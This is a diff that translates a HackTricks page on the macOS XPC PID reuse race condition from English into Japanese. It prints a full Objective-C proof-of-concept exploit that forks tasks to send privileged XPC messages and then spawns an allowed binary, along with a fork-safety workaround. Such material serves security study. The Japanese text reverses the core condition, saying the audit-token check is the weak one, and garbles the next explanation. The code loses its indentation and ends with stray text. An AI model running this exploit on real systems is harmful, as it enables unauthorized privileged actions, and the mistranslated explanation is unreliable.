@@ -1,45 +1,43 @@
-# macOS PID Reuse
+# macOS PID再利用
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## PID Reuse
+## PID再利用
 
-When a macOS **XPC service** is checking the called process based on the **PID** and not on the **audit token**, it's vulnerable to PID reuse attack. This attack is based on a **race condition** where an **exploit** is going to **send messages to the XPC** service **abusing** the functionality and just **after** that, executing **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** with the **allowed** binary.
+macOSの**XPCサービス**が、**PID**ではなく**監査トークン**に基づいて呼び出されたプロセスをチェックしている場合、PID再利用攻撃の脆弱性があります。この攻撃は、**レースコンディション**に基づいています。**エクスプロイト**は、XPCサービスに対して機能を悪用し、その後で**`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`**を実行することで、XPCサービスにメッセージを送信します。
 
-This function will make the **allowed binary own the PID** but the **malicious XPC message would have been sent** just before. So, if the **XPC** service **use** the **PID** to **authenticate** the sender and checks it **AFTER** the execution of **`posix_spawn`**, it will think it comes from an **authorized** process.
+この関数により、**許可されたバイナリがPIDを所有**しますが、**悪意のあるXPCメッセージは**それよりも**前に送信されている**可能性があります。したがって、XPCサービスが**`posix_spawn`**の実行後に**PID**を使用して送信元を**認証**し、それが**承認された**プロセスから来たと思うことになります。
 
-### Exploit example
+### エクスプロイトの例
 
-If you find the function **`shouldAcceptNewConnection`** or a function called by it **calling** **`processIdentifier`** and not calling **`auditToken`**. It highly probable means that it's v**erifying the process PID** and not the audit token.\
-Like for example in this image (taken from the reference):
+関数**`shouldAcceptNewConnection`**またはそれを呼び出す関数が、**`processIdentifier`**を呼び出しており、**`auditToken`**を呼び出していない場合、それはおそらくプロセスのPIDを検証していることを意味します。\
+たとえば、次の画像（参照から取得）のようになります。
 
 <figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-Check this example exploit (again, taken from the reference) to see the 2 parts of the exploit:
+次のエクスプロイトの例（再度、参照から取得）を確認して、エクスプロイトの2つのパートを見てください。
 
-* One that **generates several forks**
-* **Each fork** will **send** the **payload** to the XPC service while executing **`posix_spawn`** just after sending the message.
+* **複数のフォークを生成**するパート
+* 各フォークは、メッセージをXPCサービスに**送信**しながら、メッセージを送信した後に**`posix_spawn`**を実行します。
 
 {% hint style="danger" %}
-For the exploit to work it's important to export export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES or to put in th exploit:
-
+エクスプロイトが機能するためには、export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YESをエクスポートするか、エクスプロイトに以下を追加することが重要です。
 ```objectivec
 asm(".section __DATA,__objc_fork_ok\n"
 "empty:\n"
 ".no_dead_strip empty\n");
 ```
 {% endhint %}
-
 ```objectivec
 // from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
 
@@ -85,67 +83,66 @@ extern char **environ;
 
 void child() {
 
-    // send the XPC messages
-    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
-    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
-    xpcConnection.remoteObjectInterface = remoteInterface;
+// send the XPC messages
+NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
+xpcConnection.remoteObjectInterface = remoteInterface;
 
-    [xpcConnection resume];
-    [xpcConnection.remoteObjectProxy restartOS];
+[xpcConnection resume];
+[xpcConnection.remoteObjectProxy restartOS];
 
-    char target_binary[] = BINARY;
-    char *target_argv[] = {target_binary, NULL};
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    short flags;
-    posix_spawnattr_getflags(&attr, &flags);
-    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
-    posix_spawnattr_setflags(&attr, flags);
-    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
+char target_binary[] = BINARY;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&attr);
+short flags;
+posix_spawnattr_getflags(&attr, &flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&attr, flags);
+posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
 }
 
 bool create_nstasks() {
 
-    NSString *exec = [[NSBundle mainBundle] executablePath];
-    NSTask *processes[RACE_COUNT];
+NSString *exec = [[NSBundle mainBundle] executablePath];
+NSTask *processes[RACE_COUNT];
 
-    for (int i = 0; i < RACE_COUNT; i++) {
-        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
-    }
+for (int i = 0; i < RACE_COUNT; i++) {
+processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
+}
 
-    int i = 0;
-    struct timespec ts = {
-        .tv_sec = 0,
-        .tv_nsec = 500 * 1000000,
-    };
+int i = 0;
+struct timespec ts = {
+.tv_sec = 0,
+.tv_nsec = 500 * 1000000,
+};
 
-    nanosleep(&ts, NULL);
-    if (++i > 4) {
-        for (int i = 0; i < RACE_COUNT; i++) {
-            [processes[i] terminate];
-        }
-        return false;
-    }
+nanosleep(&ts, NULL);
+if (++i > 4) {
+for (int i = 0; i < RACE_COUNT; i++) {
+[processes[i] terminate];
+}
+return false;
+}
 
-    return true;
+return true;
 }
 
 int main(int argc, const char * argv[]) {
 
-    if(argc > 1) {
-        // called from the NSTasks
-        child();
+if(argc > 1) {
+// called from the NSTasks
+child();
 
-    } else {
-        NSLog(@"Starting the race");
-        create_nstasks();
-    }
+} else {
+NSLog(@"Starting the race");
+create_nstasks();
+}
 
-    return 0;
+return 0;
 }obj
 ```
-
-## Refereces
+## 参考文献
 
 * [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
 * [https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf](https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf)
@@ -154,10 +151,10 @@ int main(int argc, const char * argv[]) {
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
